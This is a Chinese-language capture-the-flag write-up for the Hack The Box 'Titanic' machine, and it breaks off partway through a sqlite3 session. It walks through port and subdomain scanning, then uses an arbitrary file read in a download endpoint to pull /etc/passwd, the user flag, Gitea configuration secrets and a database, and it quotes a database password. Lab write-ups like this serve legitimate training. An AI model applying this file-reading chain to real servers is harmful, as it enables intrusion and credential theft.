{"pageProps":{"postData":{"id":"HackTheBoxSeason7-Titanic","contentHtml":"<h1>Season7-Titanic</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/competitive/7/overview\">https://app.hackthebox.com/competitive/7/overview</a> | <code>esay</code> | 漏洞有点难找，我觉得中等左右</p>\n</blockquote>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-python\">root@kali  ~/Desktop/test/test  nmap -sT -<span class=\"hljs-built_in\">min</span>-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.55</span>  \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-02-<span class=\"hljs-number\">20</span> 08:06 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.55</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.12</span>s latency).\nNot shown: <span class=\"hljs-number\">65251</span> filtered tcp ports (no-response), <span class=\"hljs-number\">282</span> closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>  http\n\nNmap done: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">31.62</span> seconds\n</code></pre>\n<pre><code class=\"hljs language-python\">root@kali  ~/Desktop/test/test  nmap -sT -A -T4 -O -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">22</span> <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.55</span>      \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-02-<span class=\"hljs-number\">20</span> 08:06 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.55</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.16</span>s latency).\n\nPORT   STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp <span class=\"hljs-built_in\">open</span>  ssh     OpenSSH <span class=\"hljs-number\">8.9</span>p1 Ubuntu 3ubuntu0<span class=\"hljs-number\">.10</span> (Ubuntu Linux; protocol <span class=\"hljs-number\">2.0</span>)\n| ssh-hostkey: \n|   <span class=\"hljs-number\">256</span> <span class=\"hljs-number\">73</span>:03:9c:<span class=\"hljs-number\">76</span>:eb:04:f1:fe:c9:e9:<span class=\"hljs-number\">80</span>:<span class=\"hljs-number\">44</span>:9c:7f:<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">46</span> (ECDSA)\n|_  <span class=\"hljs-number\">256</span> d5:bd:1d:5e:9a:<span class=\"hljs-number\">86</span>:1c:eb:<span class=\"hljs-number\">88</span>:<span class=\"hljs-number\">63</span>:4d:5f:<span class=\"hljs-number\">88</span>:4b:7e:04 (ED25519)\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>  http    Apache httpd <span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.52</span>\n|_http-server-header: Apache/<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.52</span> (Ubuntu)\n|_http-title: Did <span class=\"hljs-keyword\">not</span> follow redirect to http://titanic.htb/\nWarning: OSScan results may be unreliable because we could <span class=\"hljs-keyword\">not</span> find at least <span class=\"hljs-number\">1</span> <span class=\"hljs-built_in\">open</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nAggressive OS guesses: Linux <span class=\"hljs-number\">4.15</span> - <span class=\"hljs-number\">5.8</span> (<span class=\"hljs-number\">96</span>%), Linux <span class=\"hljs-number\">5.3</span> - <span class=\"hljs-number\">5.4</span> (<span class=\"hljs-number\">95</span>%), Linux <span class=\"hljs-number\">2.6</span><span class=\"hljs-number\">.32</span> (<span class=\"hljs-number\">95</span>%), Linux <span class=\"hljs-number\">5.0</span> - <span class=\"hljs-number\">5.5</span> (<span class=\"hljs-number\">95</span>%), Linux <span class=\"hljs-number\">3.1</span> (<span class=\"hljs-number\">95</span>%), Linux <span class=\"hljs-number\">3.2</span> (<span class=\"hljs-number\">95</span>%), AXIS <span class=\"hljs-number\">2</span>10A <span class=\"hljs-keyword\">or</span> <span class=\"hljs-number\">211</span> Network Camera (Linux <span class=\"hljs-number\">2.6</span><span class=\"hljs-number\">.17</span>) (<span class=\"hljs-number\">95</span>%), ASUS RT-N56U WAP (Linux <span class=\"hljs-number\">3.4</span>) (<span class=\"hljs-number\">93</span>%), Linux <span class=\"hljs-number\">3.16</span> (<span class=\"hljs-number\">93</span>%), Linux <span class=\"hljs-number\">5.0</span> (<span class=\"hljs-number\">93</span>%)\nNo exact OS matches <span class=\"hljs-keyword\">for</span> host (test conditions non-ideal).\nNetwork Distance: <span class=\"hljs-number\">2</span> hops\nService Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto <span class=\"hljs-number\">1</span>/icmp)\nHOP RTT       ADDRESS\n<span class=\"hljs-number\">1</span>   <span class=\"hljs-number\">159.22</span> ms <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.16</span><span class=\"hljs-number\">.1</span>\n<span class=\"hljs-number\">2</span>   <span class=\"hljs-number\">126.49</span> ms <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.55</span>\n\nOS <span class=\"hljs-keyword\">and</span> Service detection performed. Please report <span class=\"hljs-built_in\">any</span> incorrect results at https://nmap.org/submit/ .\nNmap done: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">31.79</span> seconds\n</code></pre>\n<pre><code class=\"hljs language-python\">root@kali  ~/Desktop/test/test  nmap -script=vuln -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">22</span> <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.55</span>      \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-02-<span class=\"hljs-number\">20</span> 08:08 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.55</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.11</span>s latency).\n\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>  http\n|_http-dombased-xss: Couldn<span class=\"hljs-string\">'t find any DOM based XSS.\n|_http-stored-xss: Couldn'</span>t find <span class=\"hljs-built_in\">any</span> stored XSS vulnerabilities.\n|_http-csrf: Couldn<span class=\"hljs-string\">'t find any CSRF vulnerabilities.\n\nNmap done: 1 IP address (1 host up) scanned in 49.50 seconds\n</span></code></pre>\n<p>子域名查询，发现<code>dev</code>，添加到<code>hosts</code>里面去</p>\n<pre><code class=\"hljs language-python\">⚡ root@kali  ~  wfuzz -c -w ~/Desktop/<span class=\"hljs-type\">Dict</span>/SecLists-<span class=\"hljs-number\">2024.3</span>/Discovery/DNS/subdomains-top1million-<span class=\"hljs-number\">5000.</span>txt --hl=<span class=\"hljs-number\">9</span> -H <span class=\"hljs-string\">'Host:FUZZ.titanic.htb'</span> -u titanic.htb\n********************************************************\n* Wfuzz <span class=\"hljs-number\">3.1</span><span class=\"hljs-number\">.0</span> - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://titanic.htb/\nTotal requests: <span class=\"hljs-number\">4989</span>\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                                                                                                           \n=====================================================================\n\n000000019:   <span class=\"hljs-number\">200</span>        <span class=\"hljs-number\">275</span> L    <span class=\"hljs-number\">1278</span> W     <span class=\"hljs-number\">13870</span> Ch    <span class=\"hljs-string\">\"dev\"</span>                                                                                                                                             \n^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:<span class=\"hljs-number\">80</span>: UserWarning:Finishing pending requests...\n\nTotal time: <span class=\"hljs-number\">0</span>\nProcessed Requests: <span class=\"hljs-number\">147</span>\nFiltered Requests: <span class=\"hljs-number\">146</span>\nRequests/sec.: <span class=\"hljs-number\">0</span>\n</code></pre>\n<p>访问<code>dev</code> ，<code>gitea</code>服务</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Titanic/image.png\" alt=\"image.png\"></p>\n<p>访问<code>HTTP</code>服务，是关于泰塔尼克号的订票服务</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Titanic/image1.png\" alt=\"image.png\"></p>\n<p>点击<code>BookYourTrip</code> ，会弹出输入框，填完信息后会下载一个<code>Json</code>文件，可能存在<code>json</code>注入</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Titanic/image2.png\" alt=\"image.png\"></p>\n<p>并且接口是<code>/download?ticket=</code> ，可能会存在任意文件下载</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Titanic/image3.png\" alt=\"image.png\"></p>\n<p>扫描目录</p>\n<pre><code class=\"hljs language-python\">⚡ root@kali  ~  dirsearch -u http://titanic.htb -x <span class=\"hljs-number\">403</span> -e php,<span class=\"hljs-built_in\">zip</span>,txt\n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:<span class=\"hljs-number\">23</span>: DeprecationWarning: pkg_resources <span class=\"hljs-keyword\">is</span> deprecated <span class=\"hljs-keyword\">as</span> an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  <span class=\"hljs-keyword\">from</span> pkg_resources <span class=\"hljs-keyword\">import</span> DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0<span class=\"hljs-number\">.4</span><span class=\"hljs-number\">.3</span>\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, <span class=\"hljs-built_in\">zip</span>, txt | HTTP method: GET | Threads: <span class=\"hljs-number\">25</span> | Wordlist size: <span class=\"hljs-number\">10439</span>\n\nOutput File: /root/reports/http_titanic.htb/_25-02-<span class=\"hljs-number\">20_08</span>-<span class=\"hljs-number\">19</span>-<span class=\"hljs-number\">02.</span>txt\n\nTarget: http://titanic.htb/\n\n[08:<span class=\"hljs-number\">19</span>:02] Starting: \n[08:<span class=\"hljs-number\">19</span>:<span class=\"hljs-number\">40</span>] <span class=\"hljs-number\">405</span> -  153B  - /book                                             \n[08:<span class=\"hljs-number\">19</span>:<span class=\"hljs-number\">51</span>] <span class=\"hljs-number\">400</span> -   41B  - /download                                         \n                                                                             \nTask Completed\n\n</code></pre>\n<h2>任意文件读取</h2>\n<p>上面拿到了下载文件的接口，尝试读取<code>/etc/passwd</code> ，成功读取</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Titanic/image4.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-python\">root:x:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">0</span>:root:/root:/<span class=\"hljs-built_in\">bin</span>/bash\ndaemon:x:<span class=\"hljs-number\">1</span>:<span class=\"hljs-number\">1</span>:daemon:/usr/sbin:/usr/sbin/nologin\n<span class=\"hljs-built_in\">bin</span>:x:<span class=\"hljs-number\">2</span>:<span class=\"hljs-number\">2</span>:<span class=\"hljs-built_in\">bin</span>:/<span class=\"hljs-built_in\">bin</span>:/usr/sbin/nologin\nsys:x:<span class=\"hljs-number\">3</span>:<span class=\"hljs-number\">3</span>:sys:/dev:/usr/sbin/nologin\nsync:x:<span class=\"hljs-number\">4</span>:<span class=\"hljs-number\">65534</span>:sync:/<span class=\"hljs-built_in\">bin</span>:/<span class=\"hljs-built_in\">bin</span>/sync\ngames:x:<span class=\"hljs-number\">5</span>:<span class=\"hljs-number\">60</span>:games:/usr/games:/usr/sbin/nologin\nman:x:<span class=\"hljs-number\">6</span>:<span class=\"hljs-number\">12</span>:man:/var/cache/man:/usr/sbin/nologin\nlp:x:<span class=\"hljs-number\">7</span>:<span class=\"hljs-number\">7</span>:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:<span class=\"hljs-number\">8</span>:<span class=\"hljs-number\">8</span>:mail:/var/mail:/usr/sbin/nologin\nnews:x:<span class=\"hljs-number\">9</span>:<span class=\"hljs-number\">9</span>:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">10</span>:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">13</span>:proxy:/<span class=\"hljs-built_in\">bin</span>:/usr/sbin/nologin\nwww-data:x:<span class=\"hljs-number\">33</span>:<span class=\"hljs-number\">33</span>:www-data:/var/www:/usr/sbin/nologin\nbackup:x:<span class=\"hljs-number\">34</span>:<span class=\"hljs-number\">34</span>:backup:/var/backups:/usr/sbin/nologin\n<span class=\"hljs-built_in\">list</span>:x:<span class=\"hljs-number\">38</span>:<span class=\"hljs-number\">38</span>:Mailing <span class=\"hljs-type\">List</span> Manager:/var/<span class=\"hljs-built_in\">list</span>:/usr/sbin/nologin\nirc:x:<span class=\"hljs-number\">39</span>:<span class=\"hljs-number\">39</span>:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:<span class=\"hljs-number\">41</span>:<span class=\"hljs-number\">41</span>:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:<span class=\"hljs-number\">65534</span>:<span class=\"hljs-number\">65534</span>:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:<span class=\"hljs-number\">100</span>:<span class=\"hljs-number\">65534</span>::/nonexistent:/usr/sbin/nologin\nsystemd-network:x:<span class=\"hljs-number\">101</span>:<span class=\"hljs-number\">102</span>:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:<span class=\"hljs-number\">102</span>:<span class=\"hljs-number\">103</span>:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:<span class=\"hljs-number\">103</span>:<span class=\"hljs-number\">104</span>::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:<span class=\"hljs-number\">104</span>:<span class=\"hljs-number\">105</span>:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\npollinate:x:<span class=\"hljs-number\">105</span>:<span class=\"hljs-number\">1</span>::/var/cache/pollinate:/<span class=\"hljs-built_in\">bin</span>/false\nsshd:x:<span class=\"hljs-number\">106</span>:<span class=\"hljs-number\">65534</span>::/run/sshd:/usr/sbin/nologin\nsyslog:x:<span class=\"hljs-number\">107</span>:<span class=\"hljs-number\">113</span>::/home/syslog:/usr/sbin/nologin\nuuidd:x:<span class=\"hljs-number\">108</span>:<span class=\"hljs-number\">114</span>::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:<span class=\"hljs-number\">109</span>:<span class=\"hljs-number\">115</span>::/nonexistent:/usr/sbin/nologin\ntss:x:<span class=\"hljs-number\">110</span>:<span class=\"hljs-number\">116</span>:TPM software stack,,,:/var/lib/tpm:/<span class=\"hljs-built_in\">bin</span>/false\nlandscape:x:<span class=\"hljs-number\">111</span>:<span class=\"hljs-number\">117</span>::/var/lib/landscape:/usr/sbin/nologin\nfwupd-refresh:x:<span class=\"hljs-number\">112</span>:<span class=\"hljs-number\">118</span>:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin\nusbmux:x:<span class=\"hljs-number\">113</span>:<span class=\"hljs-number\">46</span>:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\ndeveloper:x:<span class=\"hljs-number\">1000</span>:<span class=\"hljs-number\">1000</span>:developer:/home/developer:/<span class=\"hljs-built_in\">bin</span>/bash\nlxd:x:<span class=\"hljs-number\">999</span>:<span class=\"hljs-number\">100</span>::/var/snap/lxd/common/lxd:/<span class=\"hljs-built_in\">bin</span>/false\ndnsmasq:x:<span class=\"hljs-number\">114</span>:<span class=\"hljs-number\">65534</span>:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\n_laurel:x:<span class=\"hljs-number\">998</span>:<span class=\"hljs-number\">998</span>::/var/log/laurel:/<span class=\"hljs-built_in\">bin</span>/false\n</code></pre>\n<p>根据用户信息，找到除了<code>root</code>账户以外存在有<code>shell</code>的用户，尝试读取<code>UserFlag</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Titanic/image5.png\" alt=\"image.png\"></p>\n<p>成功读到<code>userFlag</code> <code>14def493d782d069858e8dd5279ca746</code></p>\n<p>尝试读取<code>ssh</code>私钥文件，<code>NotFound</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Titanic/image6.png\" alt=\"image.png\"></p>\n<h2>gitea</h2>\n<p>给<code>dev</code>子域名做一下信息收集</p>\n<p><code>nikto</code>扫描漏洞，<code>dev</code>大概是在<code>Docker</code> 搭建</p>\n<pre><code class=\"hljs language-python\">⚡ root@kali  ~  nikto -url http://dev.titanic.htb/                     \n- Nikto v2<span class=\"hljs-number\">.5</span><span class=\"hljs-number\">.0</span>\n---------------------------------------------------------------------------\n+ Target IP:          <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.55</span>\n+ Target Hostname:    dev.titanic.htb\n+ Target Port:        <span class=\"hljs-number\">80</span>\n+ Start Time:         <span class=\"hljs-number\">2025</span>-02-<span class=\"hljs-number\">20</span> 08:<span class=\"hljs-number\">46</span>:<span class=\"hljs-number\">35</span> (GMT-<span class=\"hljs-number\">5</span>)\n---------------------------------------------------------------------------\n+ Server: Apache/<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.52</span> (Ubuntu)\n+ /: The X-Content-<span class=\"hljs-type\">Type</span>-Options header <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">not</span> <span class=\"hljs-built_in\">set</span>. This could allow the user agent to render the content of the site <span class=\"hljs-keyword\">in</span> a different fashion to the MIME <span class=\"hljs-built_in\">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-<span class=\"hljs-built_in\">type</span>-header/\n+ No CGI Directories found (use <span class=\"hljs-string\">'-C all'</span> to force check <span class=\"hljs-built_in\">all</span> possible dirs)\n+ Apache/<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.52</span> appears to be outdated (current <span class=\"hljs-keyword\">is</span> at least Apache/<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.54</span>). Apache <span class=\"hljs-number\">2.2</span><span class=\"hljs-number\">.34</span> <span class=\"hljs-keyword\">is</span> the EOL <span class=\"hljs-keyword\">for</span> the <span class=\"hljs-number\">2.</span>x branch.\n+ OPTIONS: Allowed HTTP Methods: ARRAY(<span class=\"hljs-number\">0x555859cc9d60</span>) .\nb^[[<span class=\"hljs-number\">1</span>;5D^[[<span class=\"hljs-number\">1</span>;5D+ /v2/_catalog: Uncommon header <span class=\"hljs-string\">'docker-distribution-api-version'</span> found, <span class=\"hljs-keyword\">with</span> contents: registry/<span class=\"hljs-number\">2.0</span>.\n</code></pre>\n<p>目录扫描</p>\n<pre><code class=\"hljs language-python\">⚡ root@kali  ~/Desktop/<span class=\"hljs-type\">Dict</span>/SecLists-<span class=\"hljs-number\">2024.3</span>/Discovery/DNS  dirsearch -u http://dev.titanic.htb -x <span class=\"hljs-number\">403</span>,<span class=\"hljs-number\">404</span> -e php,<span class=\"hljs-built_in\">zip</span>,txt                                                                                     \n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:<span class=\"hljs-number\">23</span>: DeprecationWarning: pkg_resources <span class=\"hljs-keyword\">is</span> deprecated <span class=\"hljs-keyword\">as</span> an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  <span class=\"hljs-keyword\">from</span> pkg_resources <span class=\"hljs-keyword\">import</span> DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0<span class=\"hljs-number\">.4</span><span class=\"hljs-number\">.3</span>\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, <span class=\"hljs-built_in\">zip</span>, txt | HTTP method: GET | Threads: <span class=\"hljs-number\">25</span> | Wordlist size: <span class=\"hljs-number\">10439</span>\n\nOutput File: /root/Desktop/<span class=\"hljs-type\">Dict</span>/SecLists-<span class=\"hljs-number\">2024.3</span>/Discovery/DNS/reports/http_dev.titanic.htb/_25-02-<span class=\"hljs-number\">20_08</span>-<span class=\"hljs-number\">48</span>-<span class=\"hljs-number\">45.</span>txt\n\nTarget: http://dev.titanic.htb/\n\n[08:<span class=\"hljs-number\">48</span>:<span class=\"hljs-number\">45</span>] Starting: \n[08:<span class=\"hljs-number\">49</span>:02] <span class=\"hljs-number\">200</span> -    1KB - /.well-known/openid-configuration\n[08:<span class=\"hljs-number\">49</span>:02] <span class=\"hljs-number\">200</span> -  206B  - /.well-known/security.txt\n[08:<span class=\"hljs-number\">49</span>:<span class=\"hljs-number\">10</span>] <span class=\"hljs-number\">303</span> -   38B  - /admin  ->  /user/login\n[08:<span class=\"hljs-number\">49</span>:<span class=\"hljs-number\">11</span>] <span class=\"hljs-number\">303</span> -   38B  - /admin/  ->  /user/login\n[08:<span class=\"hljs-number\">49</span>:<span class=\"hljs-number\">18</span>] <span class=\"hljs-number\">200</span> -   20KB - /administrator/\n[08:<span class=\"hljs-number\">49</span>:<span class=\"hljs-number\">18</span>] <span class=\"hljs-number\">200</span> -   20KB - /administrator\n[08:<span class=\"hljs-number\">49</span>:<span class=\"hljs-number\">21</span>] <span class=\"hljs-number\">200</span> -  433B  - /api/swagger\n[08:<span class=\"hljs-number\">49</span>:<span class=\"hljs-number\">35</span>] <span class=\"hljs-number\">200</span> -   25KB - /developer\n[08:<span class=\"hljs-number\">49</span>:<span class=\"hljs-number\">39</span>] <span class=\"hljs-number\">303</span> -   41B  - /explore  ->  /explore/repos\n[08:<span class=\"hljs-number\">49</span>:<span class=\"hljs-number\">39</span>] <span class=\"hljs-number\">200</span> -   20KB - /explore/repos\n[08:<span class=\"hljs-number\">49</span>:<span class=\"hljs-number\">40</span>] <span class=\"hljs-number\">301</span> -   58B  - /favicon.ico  ->  /assets/img/favicon.png\n[08:<span class=\"hljs-number\">49</span>:<span class=\"hljs-number\">49</span>] <span class=\"hljs-number\">303</span> -   38B  - /issues  ->  /user/login\n[08:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">17</span>] <span class=\"hljs-number\">200</span> -  170B  - /sitemap.xml\n[08:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">25</span>] <span class=\"hljs-number\">200</span> -   11KB - /user/login/\n[08:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">26</span>] <span class=\"hljs-number\">401</span> -   50B  - /v2\n[08:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">26</span>] <span class=\"hljs-number\">401</span> -   50B  - /v2/_catalog\n[08:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">26</span>] <span class=\"hljs-number\">401</span> -   50B  - /v2/\n\nTask Completed\n</code></pre>\n<p>访问<code>/.well-known/openid-configuration</code> 又可以找到一个子域名，再添加上<code>hosts</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Titanic/image7.png\" alt=\"image.png\"></p>\n<p>但是访问报<code>No response received from remote server.</code></p>\n<p><code>/.well-known/security.txt</code></p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># This site is running a Gitea instance.</span>\n<span class=\"hljs-comment\"># Gitea related security problems could be reported to Gitea community.</span>\n<span class=\"hljs-comment\"># Site related security problems should be reported to this site's admin.</span>\nContact: https://github.com/go-gitea/gitea/blob/main/SECURITY.md\nPolicy: https://github.com/go-gitea/gitea/blob/main/SECURITY.md\nPreferred-Languages: en\n</code></pre>\n<p><code>/developer</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Titanic/image8.png\" alt=\"image.png\"></p>\n<p><code>/developer/docker-config/src/branch/main/mysql/docker-compose.yml</code> 能找到数据库密码<code>MySQLP@$$w0rd!</code></p>\n<pre><code class=\"hljs language-python\">version: <span class=\"hljs-string\">'3.8'</span>\n\nservices:\n  mysql:\n    image: mysql:<span class=\"hljs-number\">8.0</span>\n    container_name: mysql\n    ports:\n      - <span class=\"hljs-string\">\"127.0.0.1:3306:3306\"</span>\n    environment:\n      MYSQL_ROOT_PASSWORD: <span class=\"hljs-string\">'MySQLP@$$w0rd!'</span>\n      MYSQL_DATABASE: tickets \n      MYSQL_USER: sql_svc\n      MYSQL_PASSWORD: sql_password\n    restart: always\n</code></pre>\n<p><code>/developer/docker-config/src/branch/main/gitea/docker-compose.yml</code></p>\n<p><code>/home/developer/gitea/data:/data</code>, 将容器内的数据挂在到物理机的<code>/home/developer/gitea/data</code>目录下</p>\n<pre><code class=\"hljs language-python\">version: <span class=\"hljs-string\">'3'</span>\n\nservices:\n  gitea:\n    image: gitea/gitea\n    container_name: gitea\n    ports:\n      - <span class=\"hljs-string\">\"127.0.0.1:3000:3000\"</span>\n      - <span class=\"hljs-string\">\"127.0.0.1:2222:22\"</span>  <span class=\"hljs-comment\"># Optional for SSH access</span>\n    volumes:\n      - /home/developer/gitea/data:/data <span class=\"hljs-comment\"># Replace with your path</span>\n    environment:\n      - USER_UID=<span class=\"hljs-number\">1000</span>\n      - USER_GID=<span class=\"hljs-number\">1000</span>\n    restart: always\n</code></pre>\n<p>查看<code>gitea</code>官方文档 <a href=\"https://docs.gitea.com/zh-cn/next/administration/config-cheat-sheet\">https://docs.gitea.com/zh-cn/next/administration/config-cheat-sheet</a> ，查询到配置文件存放在<code>/etc/gitea/conf/app.ini</code> 利用任意文件读取漏洞读取</p>\n<p>结合 <code>/home/developer/gitea/data:/data</code> 构造链接：<code>/home/developer/gitea/data/gitea/conf/app.ini</code></p>\n<pre><code class=\"hljs language-python\">APP_NAME = Gitea: Git <span class=\"hljs-keyword\">with</span> a cup of tea\nRUN_MODE = prod\nRUN_USER = git\nWORK_PATH = /data/gitea\n\n[repository]\nROOT = /data/git/repositories\n\n[repository.local]\nLOCAL_COPY_PATH = /data/gitea/tmp/local-repo\n\n[repository.upload]\nTEMP_PATH = /data/gitea/uploads\n\n[server]\nAPP_DATA_PATH = /data/gitea\nDOMAIN = gitea.titanic.htb\nSSH_DOMAIN = gitea.titanic.htb\nHTTP_PORT = <span class=\"hljs-number\">3000</span>\nROOT_URL = http://gitea.titanic.htb/\nDISABLE_SSH = false\nSSH_PORT = <span class=\"hljs-number\">22</span>\nSSH_LISTEN_PORT = <span class=\"hljs-number\">22</span>\nLFS_START_SERVER = true\nLFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4\nOFFLINE_MODE = true\n\n[database]\nPATH = /data/gitea/gitea.db\nDB_TYPE = sqlite3\nHOST = localhost:<span class=\"hljs-number\">3306</span>\nNAME = gitea\nUSER = root\nPASSWD = \nLOG_SQL = false\nSCHEMA = \nSSL_MODE = disable\n\n[indexer]\nISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve\n\n[session]\nPROVIDER_CONFIG = /data/gitea/sessions\nPROVIDER = file\n\n[picture]\nAVATAR_UPLOAD_PATH = /data/gitea/avatars\nREPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars\n\n[attachment]\nPATH = /data/gitea/attachments\n\n[log]\nMODE = console\nLEVEL = info\nROOT_PATH = /data/gitea/log\n\n[security]\nINSTALL_LOCK = true\nSECRET_KEY = \nREVERSE_PROXY_LIMIT = <span class=\"hljs-number\">1</span>\nREVERSE_PROXY_TRUSTED_PROXIES = *\nINTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8\nPASSWORD_HASH_ALGO = pbkdf2\n\n[service]\nDISABLE_REGISTRATION = false\nREQUIRE_SIGNIN_VIEW = false\nREGISTER_EMAIL_CONFIRM = false\nENABLE_NOTIFY_MAIL = false\nALLOW_ONLY_EXTERNAL_REGISTRATION = false\nENABLE_CAPTCHA = false\nDEFAULT_KEEP_EMAIL_PRIVATE = false\nDEFAULT_ALLOW_CREATE_ORGANIZATION = true\nDEFAULT_ENABLE_TIMETRACKING = true\nNO_REPLY_ADDRESS = noreply.localhost\n\n[lfs]\nPATH = /data/git/lfs\n\n[mailer]\nENABLED = false\n\n[openid]\nENABLE_OPENID_SIGNIN = true\nENABLE_OPENID_SIGNUP = true\n\n[cron.update_checker]\nENABLED = false\n\n[repository.pull-request]\nDEFAULT_MERGE_STYLE = merge\n\n[repository.signing]\nDEFAULT_TRUST_MODEL = committer\n\n[oauth2]\nJWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g\n</code></pre>\n<p>根据配置文件内容读取<code>gitea.db</code> 并下载</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Titanic/image9.png\" alt=\"image.png\"></p>\n<p>使用<code>sqlite3</code>打开，并且读取用表数据</p>\n<pre><code class=\"hljs language-python\">⚡ root@kali  ~/Desktop/test/titanic  sqlite3 gitea.db \nSQLite version <span class=\"hljs-number\">3.46</span><span class=\"hljs-number\">.1</span> <span class=\"hljs-number\">2024</span>-08-<span class=\"hljs-number\">13</span> 09:<span class=\"hljs-number\">16</span>:08\nEnter <span 